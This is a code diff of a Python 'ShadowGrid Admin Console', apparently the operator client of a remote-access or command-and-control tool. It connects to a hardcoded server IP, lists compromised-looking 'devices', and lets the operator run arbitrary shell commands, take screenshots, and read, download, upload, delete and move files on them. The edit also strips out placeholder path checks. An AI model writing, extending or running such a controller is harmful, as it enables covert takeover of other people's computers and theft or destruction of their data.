@@ -1,3 +1,4 @@
+# -*- coding: utf-8 -*-
 import urllib.request
 import json
 import os
@@ -7,22 +8,14 @@ import base64
 import getpass
 import requests
 import ssl
+import subprocess
 
 SERVER_URL = None
 SESSION_AUTH = None
-SERVER_HOST = "0.0.0.0"
-SERVER_PORT = 8000
-CLIENT_ID = None
-CLIENT_HOSTNAME = None
-clients = {}
-current_device = None
-current_hostname = ""
-current_platform = sys.platform
-if current_platform == "win32":
-    current_path = os.getcwd().replace('/', '\\')
-else:
-    current_path = os.getcwd()
-
+CLIENTS = {}
+CURRENT_DEVICE = None
+CURRENT_HOSTNAME = ""
+CURRENT_PATH = os.getcwd().replace('/', '\\')
 
 RESET = "\033[0m"
 GREEN = "\033[92m"
@@ -30,18 +23,21 @@ BLUE = "\033[94m"
 YELLOW = "\033[93m"
 timestamp = time.strftime("%Y%m%d_%H%M%S")
 
+
 def prompt_config():
+    """配置服务器地址"""
     global SERVER_URL
-    print("[Setup] Enter server URL (e.g., https://113.45.254.80:8444):")
+    print("[配置] 请输入服务器地址 (例如: https://113.45.254.80:8444):")
     SERVER_URL = input("> ").strip()
     if not SERVER_URL:
         SERVER_URL = "https://113.45.254.80:8444"
-    print(f"[Setup] Using server: {SERVER_URL}")
+    print(f"[配置] 使用服务器: {SERVER_URL}")
 
 
 def login():
+    """登录认证"""
     global SESSION_AUTH
-    print("[Login] Enter password:")
+    print("[登录] 请输入密码:")
     password = getpass.getpass("> ")
     try:
         auth_b64 = base64.b64encode(f"admin:{password}".encode()).decode()
@@ -54,21 +50,22 @@ def login():
         if response.status_code == 200:
             data = response.json()
             if data.get("status") == "ok":
-                print("[Login] Authentication successful")
+                print("[登录] 认证成功")
                 SESSION_AUTH = ("admin", password)
                 return True
             else:
-                print("[Login] Authentication failed")
+                print("[登录] 认证失败")
                 return False
         else:
-            print(f"[Login] HTTP {response.status_code}")
+            print(f"[登录] HTTP {response.status_code}")
             return False
     except Exception as e:
-        print(f"[Login] Error: {e}")
+        print(f"[登录] 错误: {e}")
         return False
 
 
 def req(method, endpoint, data=None):
+    """发送HTTP请求"""
     global SESSION_AUTH
     url = f"{SERVER_URL}{endpoint}"
     headers = {"Content-Type": "application/json"}
@@ -82,40 +79,42 @@ def req(method, endpoint, data=None):
             auth_str = f"{SESSION_AUTH[0]}:{SESSION_AUTH[1]}"
             auth_b64 = base64.b64encode(auth_str.encode()).decode()
             request.add_header("Authorization", f"Basic {auth_b64}")
-            
+        
         with urllib.request.urlopen(request, context=context, timeout=10.0) as response:
             result = json.loads(response.read().decode())
-            
             return result
     except Exception as e:
-        
         return {"error": str(e)}
 
+
 def fetch_clients():
-    global clients
+    """获取设备列表"""
+    global CLIENTS
     try:
         resp = req("GET", "/clients")
-        clients = resp.get("clients", [])
-        return clients
+        CLIENTS = resp.get("clients", [])
+        return CLIENTS
     except Exception as e:
-        print(f"[Error] Fetch clients failed: {e}")
+        print(f"[错误] 获取设备列表失败: {e}")
         return []
 
 
 def print_clients():
-    if not clients:
-        print("[Info] No connected devices")
+    """打印设备列表"""
+    if not CLIENTS:
+        print("[信息] 没有已连接的设备")
         return
-    print("\n[Info] Available devices:")
-    for idx, client in enumerate(clients, 1):
+    print("\n[信息] 可用设备:")
+    for idx, client in enumerate(CLIENTS, 1):
         cid = client.get("id", "unknown")
         hostname = client.get("hostname", "unknown")
         ip = client.get("ip", "unknown")
         print(f"  {idx}. {hostname} ({ip}) [ID: {cid}]")
     print()
 
+
 def send_command(client_id, cmd_type, payload=None):
-    time.sleep(0.1)  
+    """发送命令到设备"""
     try:
         data = {"type": cmd_type}
         if payload is not None:
@@ -125,66 +124,29 @@ def send_command(client_id, cmd_type, payload=None):
     except Exception as e:
         return {"error": str(e)}
 
-def normalize_path(path):
-    if os.path.isabs(path):
-        return os.path.normpath(path)
-    else:
-        return os.path.normpath(os.path.join(current_path, path))
-
-def is_safe_path(base_path, requested_path):
-   
-    return True
-
-def ensure_dir(directory):
-    if not os.path.exists(directory):
-        os.makedirs(directory, exist_ok=True)
 
 def get_results(client_id):
+    """获取命令结果"""
     try:
         resp = req("GET", f"/results/{client_id}")
         return resp.get("results", [])
     except Exception as e:
         return [{"error": str(e)}]
 
+
 def wait_for_result(client_id, timeout=0.8):
+    """等待命令结果"""
     start_time = time.time()
     while time.time() - start_time < timeout:
         results = get_results(client_id)
         if results:
             return results
-        time.sleep(0.02)  # 从 0.5 改为 0.1
+        time.sleep(0.02)
     return None
 
 
-def clear_screen():
-    os.system("cls" if os.name == "nt" else "clear")
-
-def print_help():
-    print("\n可用命令：")
-    print(f"  {YELLOW}list{RESET}              列出所有可用设备")
-    print(f"  {YELLOW}use <编号>{RESET}          选择设备（按编号）")
-    print(f"  {YELLOW}back{RESET}              返回设备列表")
-    print(f"  {YELLOW}clear{RESET}             清屏")
-    print(f"  {YELLOW}help{RESET}              显示帮助信息")
-    print(f"  {YELLOW}quit{RESET}              退出程序")
-    print("")
-    print("交互命令（选择设备后）：")
-    print(f"  {YELLOW}ls [路径]{RESET}         列出目录内容")
-    print(f"  {YELLOW}cd <目录>{RESET}         切换目录")
-    print(f"  {YELLOW}pwd{RESET}               显示当前目录")
-    print(f"  {YELLOW}cat <文件>{RESET}        显示文件内容")
-    print(f"  {YELLOW}dl <文件> [目录]{RESET}   下载文件")
-    print(f"  {YELLOW}ud <文件> [目录]{RESET}   上传文件")
-    print(f"  {YELLOW}rm <路径> [-r]{RESET}    删除文件/目录")
-    print(f"  {YELLOW}mv <源> <目标>{RESET}    移动/重命名")
-    print(f"  {YELLOW}file <路径>{RESET}       查看文件类型")
-    print(f"  {YELLOW}find <模式> [-t]{RESET}  查找文件")
-    print(f"  {YELLOW}help{RESET}              显示帮助")
-    print(f"  {YELLOW}back{RESET}              返回设备列表")
-    print(f"  {YELLOW}quit{RESET}              退出")
-    print("")
-
 def format_ls_output(items):
+    """格式化ls输出"""
     if not items:
         return
     if not isinstance(items, list):
@@ -199,9 +161,10 @@ def format_ls_output(items):
                 print(f"  {name}")
         else:
             print(f"  {item}")
-    
-    
+
+
 def print_failed_result(r):
+    """打印错误结果"""
     err = r.get("error", "")
     result = r.get("result", "")
     if err:
@@ -209,11 +172,46 @@ def print_failed_result(r):
     elif isinstance(result, str):
         print(f"[结果] {result}")
 
+
+def clear_screen():
+    """清屏"""
+    os.system("cls" if os.name == "nt" else "clear")
+
+
+def print_help():
+    """打印帮助"""
+    print("\n可用命令：")
+    print(f"  {YELLOW}list{RESET}              列出所有可用设备")
+    print(f"  {YELLOW}use <编号>{RESET}          选择设备")
+    print(f"  {YELLOW}back{RESET}              返回设备列表")
+    print(f"  {YELLOW}clear{RESET}             清屏")
+    print(f"  {YELLOW}help{RESET}              显示帮助")
+    print(f"  {YELLOW}quit{RESET}              退出")
+    print("")
+    print("设备命令：")
+    print(f"  {YELLOW}ls [路径]{RESET}         列出目录")
+    print(f"  {YELLOW}cd <目录>{RESET}         切换目录")
+    print(f"  {YELLOW}pwd{RESET}               显示当前目录")
+    print(f"  {YELLOW}cat <文件>{RESET}        查看文件")
+    print(f"  {YELLOW}dl <文件> [目录]{RESET}   下载")
+    print(f"  {YELLOW}ud <文件> [目录]{RESET}   上传")
+    print(f"  {YELLOW}rm <路径> [-r]{RESET}    删除")
+    print(f"  {YELLOW}mv <源> <目标>{RESET}    移动")
+    print(f"  {YELLOW}file <路径>{RESET}       查看类型")
+    print(f"  {YELLOW}find <模式> [-t]{RESET}  查找")
+    print(f"  {YELLOW}shell <命令>{RESET}      执行命令")
+    print(f"  {YELLOW}screenshot{RESET}         截图")
+    print(f"  {YELLOW}help{RESET}              显示帮助")
+    print(f"  {YELLOW}back{RESET}              返回")
+
+
 def interaction_loop(client_id, hostname):
-    global current_device, current_hostname, current_path
-    current_device = client_id
-    current_hostname = hostname
-    current_path = os.getcwd().replace('/', '\\')
+    """设备交互循环"""
+    global CURRENT_DEVICE, CURRENT_HOSTNAME, CURRENT_PATH
+    CURRENT_DEVICE = client_id
+    CURRENT_HOSTNAME = hostname
+    CURRENT_PATH = os.getcwd().replace('/', '\\')
+    
     print(f"[信息] 已连接到设备: {hostname} (ID: {client_id})")
     print(f"[信息] 输入 'back' 返回设备列表")
     print(f"[信息] 输入 'help' 查看可用命令")
@@ -222,27 +220,23 @@ def interaction_loop(client_id, hostname):
     send_command(client_id, "shell", "hostname")
     time.sleep(0.5)
     remote_hostname = ""
-    results = get_results(client_id)
-    for r in results:
-        result_data = r.get("result", "")
+    for r in get_results(client_id):
         if r.get("result_type") == "shell":
-            remote_hostname = result_data.strip()
+            remote_hostname = r.get("result", "").strip()
     
     send_command(client_id, "shell", "whoami")
     time.sleep(0.5)
     remote_user = ""
-    results = get_results(client_id)
-    for r in results:
-        result_data = r.get("result", "")
+    for r in get_results(client_id):
         if r.get("result_type") == "shell":
-            remote_user = result_data.strip().split('\\')[-1].split('/')[-1]
+            remote_user = r.get("result", "").strip().split('\\')[-1].split('/')[-1]
     
     print(f"\n{BLUE}┌──({remote_user}@{remote_hostname})-[~]{RESET}")
-    print(f"{BLUE}└─# {RESET}{GREEN}{hostname}:{current_path}{RESET} ")
+    print(f"{BLUE}└─# {RESET}{GREEN}{hostname}:{CURRENT_PATH}{RESET} ")
     
     while True:
         try:
-            prompt = f"{BLUE}┌──({remote_user}@{remote_hostname})-[{current_path}]{RESET}\n{BLUE}└─# {GREEN}>{RESET} "
+            prompt = f"{BLUE}┌──({remote_user}@{remote_hostname})-[{CURRENT_PATH}]{RESET}\n{BLUE}└─# {GREEN}>{RESET} "
             cmd_input = input(prompt).strip()
         except EOFError:
             print("\n[信息] 退出中...")
@@ -263,8 +257,8 @@ def interaction_loop(client_id, hostname):
             sys.exit(0)
         elif cmd == "back":
             print("[信息] 返回设备列表中...")
-            current_device = None
-            current_hostname = ""
+            CURRENT_DEVICE = None
+            CURRENT_HOSTNAME = ""
             return
         elif cmd == "clear":
             clear_screen()
@@ -273,30 +267,12 @@ def interaction_loop(client_id, hostname):
         elif cmd == "list":
             fetch_clients()
             print_clients()
-        elif cmd == "shell":
-            if arg is None:
-                print("[错误] 用法: shell <命令>")
-                continue
-            send_command(client_id, "shell", arg)
-        results = wait_for_result(client_id)
-        if results:
-            for r in results:
-                result_type = r.get("result_type", "")
-                result_data = r.get("result", "")
-                if result_type == "shell":
-                    print(f"[结果]\n{result_data}")
-                elif result_type == "error":
-                    print_failed_result(r)
-                else:
-                    print(f"[结果] {r}")
-
         elif cmd == "screenshot":
             send_command(client_id, "screenshot")
             results = wait_for_result(client_id)
             if results:
                 for r in results:
-                    result_type = r.get("result_type", "")
-                    if result_type == "screenshot":
+                    if r.get("result_type") == "screenshot":
                         img_data = r.get("result", "")
                         filename = r.get("filename", "shot.png")
                         try:
@@ -308,296 +284,198 @@ def interaction_loop(client_id, hostname):
                             print(f"[结果] 截图已保存: {save_path}")
                         except Exception as e:
                             print(f"[错误] 无法保存截图: {e}")
-                    elif result_type == "error":
+                    elif r.get("result_type") == "error":
                         print_failed_result(r)
-                    else:
-                        print(f"[结果] {r}")
         elif cmd == "ls":
-            if arg:
-                full_path = os.path.join(current_path, arg) if not os.path.isabs(arg) else arg
-            else:
-                full_path = current_path
+            full_path = arg if arg else CURRENT_PATH
             full_path = os.path.normpath(full_path)
-            if not is_safe_path(current_path, full_path):
-                                print("[Error] Invalid path: path traversal detected")
-                                continue
             send_command(client_id, "ls", full_path)
             results = wait_for_result(client_id)
             if results:
                 for r in results:
-                    result_data = r.get("result", [])
-                    if isinstance(result_data, list):
-                        format_ls_output(result_data)
-                    else:
-                        print_failed_result(r)
-        elif cmd == "cat":
-            if arg is None:
-                print("[Error] Usage: cat <file_path>")
-                continue
-            full_path = os.path.join(current_path, arg) if not os.path.isabs(arg) else arg
-            full_path = os.path.normpath(full_path)
-            if not is_safe_path(current_path, full_path):
-                                print("[Error] Invalid path: path traversal detected")
-                                continue
-            send_command(client_id, "cat", full_path)
-            results = wait_for_result(client_id)
-            if results:
-                for r in results:
-                    result_type = r.get("result_type", "")
-                    if result_type == "file":
-                        file_data = r.get("result", "")
-                        if file_data:
-                            try:
-                                decoded = base64.b64decode(file_data).decode()
-                                print(f"[结果] {decoded}")
-                            except Exception as e:
-                                print(f"[错误] 解码失败: {e}")
-                        else:
-                            print("[错误] 文件为空")
-                    elif result_type == "error":
-                        print_failed_result(r)
-                    else:
-                        print(f"[结果] {r}")
+                    format_ls_output(r.get("result", []))
         elif cmd == "cd":
-            if arg is None:
-                print("[Error] Usage: cd <dir>")
+            if not arg:
+                print("[错误] 用法: cd <目录>")
                 continue
-            full_path = os.path.join(current_path, arg) if not os.path.isabs(arg) else arg
-            full_path = os.path.normpath(full_path)
-            # Allow drive letter change (e.g., "D:", "C:")
-            if len(full_path) == 2 and full_path[1] == ":" and full_path[0].upper() in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
-                pass  # Allow drive change
-            elif not is_safe_path(current_path, full_path):
-                            print("[Error] Invalid path: path traversal detected")
-                            continue
+            full_path = os.path.normpath(os.path.join(CURRENT_PATH, arg))
             send_command(client_id, "cd", full_path)
             results = wait_for_result(client_id)
             if results:
                 for r in results:
-                    result_type = r.get("result_type", "")
-                    if result_type == "dir":
-                        current_path = full_path
-                        print(f"[结果] 已切换到目录 {current_path}")
-                    elif result_type == "error":
-                        print_failed_result(r)
+                    if r.get("result_type") == "dir":
+                        CURRENT_PATH = full_path
+                        print(f"[结果] 已切换到目录 {CURRENT_PATH}")
                     else:
-                        print(f"[结果] {r}")
+                        print_failed_result(r)
         elif cmd == "pwd":
             send_command(client_id, "pwd")
             results = wait_for_result(client_id)
             if results:
                 for r in results:
-                    result_data = r.get("result", "")
-                    print(f"[结果] {result_data}")
-        elif cmd == "rm":
-            if arg is None:
-                print("[错误] 用法: rm <路径> [-r]")
+                    print(f"[结果] {r.get('result', '')}")
+        elif cmd == "cat":
+            if not arg:
+                print("[错误] 用法: cat <文件路径>")
                 continue
-            recursive = False
-            actual_path = arg
-            if arg.endswith(" -r"):
-                actual_path = arg[:-3]
-                recursive = True
-            full_path = os.path.join(current_path, actual_path) if not os.path.isabs(actual_path) else actual_path
-            full_path = os.path.normpath(full_path)
-            if not is_safe_path(current_path, full_path):
-                            print("[Error] Invalid path: path traversal detected")
-                            continue
-            send_command(client_id, "rm", {"path": full_path, "recursive": recursive})
+            full_path = os.path.normpath(os.path.join(CURRENT_PATH, arg))
+            send_command(client_id, "cat", full_path)
             results = wait_for_result(client_id)
             if results:
                 for r in results:
-                    result_type = r.get("result_type", "")
-                    if result_type == "ok":
-                        print(f"[结果] 删除成功")
-                    elif result_type == "error":
-                        print_failed_result(r)
-                    else:
-                        print(f"[结果] {r}")
-        elif cmd == "mv":
-            if arg is None:
-                print("[错误] 用法: mv <源> <目标>")
-                continue
-            mv_parts = arg.split(maxsplit=1)
-            if len(mv_parts) < 2:
-                print("[错误] 用法: mv <源> <目标>")
-                continue
-            src_path, dst_path = mv_parts
-            src_full = os.path.join(current_path, src_path) if not os.path.isabs(src_path) else src_path
-            dst_full = os.path.join(current_path, dst_path) if not os.path.isabs(dst_path) else dst_path
-            src_full = os.path.normpath(src_full)
-            dst_full = os.path.normpath(dst_full)
-            if not is_safe_path(current_path, src_full):
-                                print("[错误] 无效的源路径: 检测到路径遍历")
-                                continue
-            if not is_safe_path(current_path, dst_full):
-                                print("[错误] 无效的目标路径: 检测到路径遍历")
-                                continue
-            send_command(client_id, "mv", {"from_path": src_full, "to_path": dst_full})
-            results = wait_for_result(client_id)
-            if results:
-                for r in results:
-                    result_type = r.get("result_type", "")
-                    if result_type == "ok":
-                        print(f"[结果] 移动/重命名成功")
-                    elif result_type == "error":
-                        print_failed_result(r)
-                    else:
-                        print(f"[结果] {r}")
-        elif cmd == "file":
-            if arg is None:
-                print("[错误] 用法: file <路径>")
-                continue
-            full_path = os.path.join(current_path, arg) if not os.path.isabs(arg) else arg
-            full_path = os.path.normpath(full_path)
-            if not is_safe_path(current_path, full_path):
-                            print("[Error] Invalid path: path traversal detected")
-                            continue
-            send_command(client_id, "file", {"path": full_path})
-            results = wait_for_result(client_id)
-            if results:
-                for r in results:
-                    result_type = r.get("result_type", "")
-                    if result_type == "file":
-                        file_type = r.get("result", "")
-                        print(f"[结果] 文件类型: {file_type}")
-                    elif result_type == "error":
-                        print_failed_result(r)
-                    else:
-                        print(f"[结果] {r}")
-        elif cmd == "find":
-            if arg is None:
-                print("[错误] 用法: find <模式> [-t]")
-                continue
-            find_parts = arg.split()
-            pattern = None
-            file_type = None
-            i = 0
-            while i < len(find_parts):
-                if find_parts[i] == "-t":
-                    if i + 1 < len(find_parts):
-                        file_type = find_parts[i + 1]
-                        if file_type not in ["f", "d"]:
-                            print("[错误] 无效类型: 必须是 'f' 或 'd'")
-                            break
-                        i += 1
-                else:
-                    if pattern is None:
-                        pattern = find_parts[i]
-                i += 1
-            if pattern is None:
-                print("[错误] 用法: find <模式> [-t]")
-                continue
-            full_path = os.path.join(current_path, pattern) if not os.path.isabs(pattern) else pattern
-            full_path = os.path.normpath(full_path)
-            if not is_safe_path(current_path, full_path):
-                            print("[Error] Invalid path: path traversal detected")
-                            continue
-            send_command(client_id, "find", {"path": full_path, "name": pattern, "type": file_type if file_type else None})
-            results = wait_for_result(client_id)
-            if results:
-                for r in results:
-                    result_type = r.get("result_type", "")
-                    if result_type == "list":
-                        items = r.get("result", [])
-                        if items:
-                            for item in items:
-                                p = item.get("path", "")
-                                t = item.get("type", "")
-                                print(f"  [{t.upper()}] {p}")
+                    if r.get("result_type") == "file":
+                        file_data = r.get("result", "")
+                        if file_data:
+                            try:
+                                print(f"[结果] {base64.b64decode(file_data).decode()}")
+                            except Exception as e:
+                                print(f"[错误] 解码失败: {e}")
                         else:
-                            print("[结果] 未找到匹配项")
-                    elif result_type == "error":
-                        print_failed_result(r)
+                            print("[错误] 文件为空")
                     else:
-                        print(f"[结果] {r}")
+                        print_failed_result(r)
         elif cmd == "dl":
-            if arg is None:
+            if not arg:
                 print("[错误] 用法: dl <文件路径> [保存目录]")
                 continue
-            dl_parts = arg.split(maxsplit=1)
-            file_path = dl_parts[0]
-            save_dir = dl_parts[1] if len(dl_parts) > 1 else "."
-            full_path = os.path.join(current_path, file_path) if not os.path.isabs(file_path) else file_path
-            full_path = os.path.normpath(full_path)
-            if not is_safe_path(current_path, full_path):
-                            print("[Error] Invalid path: path traversal detected")
-                            continue
-            save_dir = normalize_path(save_dir)
-            ensure_dir(save_dir)
+            parts = arg.split(maxsplit=1)
+            file_path = parts[0]
+            save_dir = parts[1] if len(parts) > 1 else "downloads"
+            full_path = os.path.normpath(os.path.join(CURRENT_PATH, file_path))
+            os.makedirs(save_dir, exist_ok=True)
             send_command(client_id, "dl", {"path": file_path, "save_as": ""})
             results = wait_for_result(client_id)
             if results:
                 for r in results:
-                    result_type = r.get("result_type", "")
-                    if result_type == "file":
-                        file_data = r.get("result", "")
-                        filename = r.get("filename", "downloaded_file")
-                        try:
-                            file_bytes = base64.b64decode(file_data)
-                            save_path = os.path.join(save_dir, filename)
-                            with open(save_path, "wb") as f:
-                                f.write(file_bytes)
-                            print(f"[结果] 文件已下载: {save_path}")
-                        except Exception as e:
-                            print(f"[错误] 无法保存文件: {e}")
-                    elif result_type == "error":
-                        print_failed_result(r)
+                    if r.get("result_type") == "file":
+                        file_bytes = base64.b64decode(r.get("result", ""))
+                        save_path = os.path.join(save_dir, r.get("filename", "downloaded"))
+                        with open(save_path, "wb") as f:
+                            f.write(file_bytes)
+                        print(f"[结果] 文件已下载: {save_path}")
                     else:
-                        print(f"[结果] {r}")
+                        print_failed_result(r)
         elif cmd == "ud":
-            if arg is None:
-                print("[错误] 用法: ud <本地文件路径> [远程目录]")
+            if not arg:
+                print("[错误] 用法: ud <本地文件> [远程目录]")
                 continue
-            ud_parts = arg.split(maxsplit=1)
-            local_file = ud_parts[0]
-            remote_dir = ud_parts[1] if len(ud_parts) > 1 else "."
+            parts = arg.split(maxsplit=1)
+            local_file = parts[0]
+            remote_dir = parts[1] if len(parts) > 1 else "."
             if not os.path.isfile(local_file):
                 print("[错误] 本地文件未找到")
                 continue
-            try:
-                with open(local_file, "rb") as f:
-                    base64_data = base64.b64encode(f.read()).decode()
-                remote_path = os.path.join(current_path, remote_dir) if not os.path.isabs(remote_dir) else remote_dir
-                remote_path = os.path.normpath(remote_path)
-                if not is_safe_path(current_path, remote_path):
-                            print("[Error] Invalid path: path traversal detected")
-                            continue
-                filename = os.path.basename(local_file)
-                save_as = os.path.join(remote_path, filename) if os.path.isdir(remote_path) else remote_path
-                send_command(client_id, "ud", {"base64_data": base64_data, "save_as": save_as})
-                results = wait_for_result(client_id)
-                if results:
-                    for r in results:
-                        result_type = r.get("result_type", "")
-                        if result_type == "ok":
-                            print(f"[结果] 文件上传成功")
-                        elif result_type == "error":
-                            print_failed_result(r)
-                        else:
-                            print(f"[结果] {r}")
-            except Exception as e:
-                print(f"[错误] 无法读取本地文件: {e}")
+            with open(local_file, "rb") as f:
+                base64_data = base64.b64encode(f.read()).decode()
+            save_as = os.path.join(CURRENT_PATH, os.path.basename(local_file))
+            send_command(client_id, "ud", {"base64_data": base64_data, "save_as": save_as})
+            results = wait_for_result(client_id)
+            if results:
+                for r in results:
+                    print_failed_result(r)
+        elif cmd == "rm":
+            if not arg:
+                print("[错误] 用法: rm <路径> [-r]")
+                continue
+            recursive = arg.endswith(" -r")
+            path = arg[:-3] if recursive else arg
+            full_path = os.path.normpath(os.path.join(CURRENT_PATH, path))
+            send_command(client_id, "rm", {"path": full_path, "recursive": recursive})
+            results = wait_for_result(client_id)
+            if results:
+                for r in results:
+                    print_failed_result(r)
+        elif cmd == "mv":
+            if not arg or len(arg.split()) < 2:
+                print("[错误] 用法: mv <源> <目标>")
+                continue
+            parts = arg.split(maxsplit=1)
+            src, dst = parts[0], parts[1]
+            full_src = os.path.normpath(os.path.join(CURRENT_PATH, src))
+            full_dst = os.path.normpath(os.path.join(CURRENT_PATH, dst))
+            send_command(client_id, "mv", {"from_path": full_src, "to_path": full_dst})
+            results = wait_for_result(client_id)
+            if results:
+                for r in results:
+                    print_failed_result(r)
+        elif cmd == "file":
+            if not arg:
+                print("[错误] 用法: file <路径>")
+                continue
+            full_path = os.path.normpath(os.path.join(CURRENT_PATH, arg))
+            send_command(client_id, "file", {"path": full_path})
+            results = wait_for_result(client_id)
+            if results:
+                for r in results:
+                    if r.get("result_type") == "file":
+                        print(f"[结果] {r.get('result', '')}")
+                    else:
+                        print_failed_result(r)
+        elif cmd == "find":
+            if not arg:
+                print("[错误] 用法: find <模式> [-t 类型]")
+                continue
+            parts = arg.split()
+            pattern = None
+            file_type = None
+            i = 0
+            while i < len(parts):
+                if parts[i] == "-t" and i + 1 < len(parts):
+                    file_type = parts[i + 1]
+                    i += 1
+                else:
+                    if not pattern:
+                        pattern = parts[i]
+                i += 1
+            if not pattern:
+                print("[错误] 用法: find <模式> [-t 类型]")
+                continue
+            full_path = os.path.normpath(os.path.join(CURRENT_PATH, pattern))
+            send_command(client_id, "find", {"path": full_path, "name": pattern, "type": file_type})
+            results = wait_for_result(client_id)
+            if results:
+                for r in results:
+                    if r.get("result_type") == "list":
+                        for item in r.get("result", []):
+                            print(f"  [{item.get('type', '').upper()}] {item.get('path', '')}")
+                    else:
+                        print_failed_result(r)
+        elif cmd == "shell":
+            if not arg:
+                print("[错误] 用法: shell <命令>")
+                continue
+            send_command(client_id, "shell", arg)
+            results = wait_for_result(client_id)
+            if results:
+                for r in results:
+                    if r.get("result_type") == "shell":
+                        print(f"[结果]\n{r.get('result', '')}")
+                    else:
+                        print_failed_result(r)
+        elif cmd == "help":
+            print_help()
         else:
-            print(f"[错误] 未知命令: {cmd}。使用 'help' 查看命令列表。")
+            print(f"[错误] 未知命令: {cmd}")
+
 
 def show_splash():
+    """显示启动画面"""
     import splash
     print(splash.get_splash())
 
+
 def main():
+    """主函数"""
     show_splash()
-    print("[Info] ShadowGrid Admin Console v1.0")
+    print("[信息] ShadowGrid Admin Console v1.0")
     
     prompt_config()
     
     if not login():
-        print("[Error] Login failed")
+        print("[错误] 登录失败")
         sys.exit(1)
     
-    print("[Info] Enter 'help' for commands")
-    
-    device_control_cmds = {"ls", "cd", "pwd", "cat", "dl", "ud", "rm", "mv", "file", "find"}
+    print("[信息] 输入 'help' 查看可用命令")
     
     while True:
         try:
@@ -617,7 +495,7 @@ def main():
         arg = parts[1] if len(parts) > 1 else None
         
         if cmd == "quit":
-            print("[Info] Exiting...")
+            print("[信息] 退出中...")
             break
         elif cmd == "help":
             print_help()
@@ -625,24 +503,22 @@ def main():
             fetch_clients()
             print_clients()
         elif cmd == "use":
-            if arg is None:
-                print("[Error] Usage: use <number>")
+            if not arg:
+                print("[错误] 用法: use <编号>")
                 continue
             try:
                 num = int(arg)
-                if num < 1 or num > len(clients):
-                    print(f"[Error] Invalid device number. Use 'list' to see devices.")
+                if num < 1 or num > len(CLIENTS):
+                    print(f"[错误] 无效的设备编号")
                     continue
-                selected = clients[num - 1]
+                selected = CLIENTS[num - 1]
                 interaction_loop(selected.get("id"), selected.get("hostname"))
             except ValueError:
-                print("[Error] Invalid device number")
-        elif cmd in device_control_cmds:
-            print("[Error] Select a device first. Use 'use <number>'")
+                print("[错误] 无效的设备编号")
         elif cmd == "clear":
             clear_screen()
         else:
-            print(f"[Error] Unknown command: {cmd}. Use 'help' for command list.")
+            print(f"[错误] 未知命令: {cmd}。使用 'help' 查看命令列表。")
 
 
 if __name__ == "__main__":
